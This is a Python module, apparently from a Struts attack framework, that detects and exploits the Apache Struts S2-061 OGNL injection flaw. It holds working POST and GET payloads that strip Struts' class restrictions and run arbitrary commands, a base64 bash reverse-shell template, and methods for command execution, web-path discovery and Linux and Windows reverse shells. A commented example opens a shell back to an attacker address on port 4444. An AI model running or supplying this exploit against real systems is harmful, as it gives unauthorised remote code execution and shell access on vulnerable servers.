from exploit import tools
import random
from lxml import html as lhtml
from exploit.static_tools import handle_tools

class S2_061:
    """S2_061漏洞检测利用类"""
    info = "[+] S2-061:影响版本Struts 2.0.0-2.5.25;POST,GET请求发送数据;支持 支持获取WEB路径,任意命令执行,反弹Windows,Linux shell"
    exec_payload1 = "------WebKitFormBoundaryl7d1B1aGsV2wcZwF\r\nContent-Disposition: form-data; name=\"id\"\r\n\r\n%{{(#instancemanager=#application[\"org.apache.tomcat.InstanceManager\"]).(#stack=#attr[\"com.opensymphony.xwork2.util.ValueStack.ValueStack\"]).(#bean=#instancemanager.newInstance(\"org.apache.commons.collections.BeanMap\")).(#bean.setBean(#stack)).(#context=#bean.get(\"context\")).(#bean.setBean(#context)).(#macc=#bean.get(\"memberAccess\")).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance(\"java.util.HashSet\")).(#bean.put(\"excludedClasses\",#emptyset)).(#bean.put(\"excludedPackageNames\",#emptyset)).(#arglist=#instancemanager.newInstance(\"java.util.ArrayList\")).(#arglist.add(\"{cmd}\")).(#execute=#instancemanager.newInstance(\"freemarker.template.utility.Execute\")).(#execute.exec(#arglist))}}\r\n------WebKitFormBoundaryl7d1B1aGsV2wcZwF--"
    exec_payload2 = "?id=%25{{(%27Powered_by_Unicode_Potats0%2cenjoy_it%27).(%23UnicodeSec+%3d+%23application[%27org.apache.tomcat.InstanceManager%27]).(%23potats0%3d%23UnicodeSec.newInstance(%27org.apache.commons.collections.BeanMap%27)).(%23stackvalue%3d%23attr[%27struts.valueStack%27]).(%23potats0.setBean(%23stackvalue)).(%23context%3d%23potats0.get(%27context%27)).(%23potats0.setBean(%23context)).(%23sm%3d%23potats0.get(%27memberAccess%27)).(%23emptySet%3d%23UnicodeSec.newInstance(%27java.util.HashSet%27)).(%23potats0.setBean(%23sm)).(%23potats0.put(%27excludedClasses%27%2c%23emptySet)).(%23potats0.put(%27excludedPackageNames%27%2c%23emptySet)).(%23exec%3d%23UnicodeSec.newInstance(%27freemarker.template.utility.Execute%27)).(%23cmd%3d{{%27{cmd}%27}}).(%23res%3d%23exec.exec(%23cmd))}}"
    shell = "bash -c {echo,SHELL}|{base64,-d}|{bash,-i}"
    check_poc = "?id=%25%7b+%27test%27+%2b+({num1}+%2b+{num2}).toString()%7d"

    def __init__(self, url, data=None, headers=None, encoding="UTF-8"):

        self.url = url
        self.headers  = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36',
            'Accept': '*/*',
            'Referer': url,
            'Accept-Encoding': 'gzip,deflate',
            'Connection': 'close',
            'Cookie': 'JSESSIONID=E25862AE388D006049EA9D3CEF12F246',
            'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF',
            'Content-Length': '877'
        }
        self.get_headers = tools.parser_headers(headers)
        self.encoding = encoding
        self.exec_payload = "payload1"
        self.is_vul = False
        self.exec_dict = {"payload1": self.exec_cmd1, "payload2": self.exec_cmd2}

    def check(self):
        """检测漏洞是否存在"""
        num1 = random.randint(10000, 100000)
        num2 = random.randint(10000, 100000)
        num_sum = str(num1 + num2)
        poc = self.check_poc.format(num1=num1, num2=num2)
        html = tools.get(self.url+poc, self.get_headers, self.encoding)
        if str(html).startswith("ERROR:"):
            return html
        elif html:
            etree = lhtml.etree
            page = etree.HTML(html)
            data = page.xpath('//a[@id]/@id')
            if "test"+num_sum in data:
                self.is_vul = True
                exec_payload = self.select_exec()
                if str(exec_payload).startswith("ERROR:"):
                    return exec_payload
                else:
                    return 'S2-061'
        return self.is_vul

    def select_exec(self):
        """选择合适的执行命令的exp"""

        hash_str = handle_tools.get_hash()

        for k,v in self.exec_dict.items():
            html = v("echo "+ hash_str)
            if hash_str in html:
                self.exec_payload = k
                return True

        return "ERROR: The vulnerability exists, but no payload is available!"

    def get_path(self):
        """获取web目录"""
        html = self.exec_dict.get(self.exec_payload)("pwd")

        return html

    def exec_cmd(self, cmd):
        if self.exec_payload not in self.exec_dict:
            return None
        result = self.exec_dict.get(self.exec_payload)(cmd)
        return result

    def exec_cmd1(self, cmd):
        # post传值
        payload = self.exec_payload1.format(cmd=cmd)
        html = tools.post(self.url, payload, self.headers, self.encoding)
        etree = lhtml.etree
        page = etree.HTML(html)
        data = page.xpath('//a[@id]/@id')
        if len(data) > 0:
            return f"[+]:{data[0]}"
        else:
            return html

    def exec_cmd2(self, cmd):
        # get传值
        data = self.exec_payload2.format(cmd=cmd)
        html = tools.get(self.url + data, self.get_headers, self.encoding)
        etree = lhtml.etree
        page = etree.HTML(html)
        data = page.xpath('//a[@id]/@id')
        if len(data) > 0:
            return f"[+]:{data[0]}"
        else:
            return html

    def reverse_shell(self, ip, port):
        """Linux 反弹shell"""
        print("类函数")
        html = tools.reverse_shell(self, ip, port)
        return html

    def reverse_shell_win(self, ip, port):
        """windows 反弹shell"""
        html = tools.reverse_shell_win(self, ip, port)
        return html

# if __name__ == '__main__':
#     s = S2_061("http://192.168.217.138:8080/index.action")
#     tools._proxies = proxies = {
#         "http":"127.0.0.1:8080",
#         "https":"127.0.0.1:8080"
#     }
#     print(s.check())
#     print(s.get_path())
#     print(s.exec_cmd("whoami"))
#     s.reverse_shell("192.168.3.134", "4444")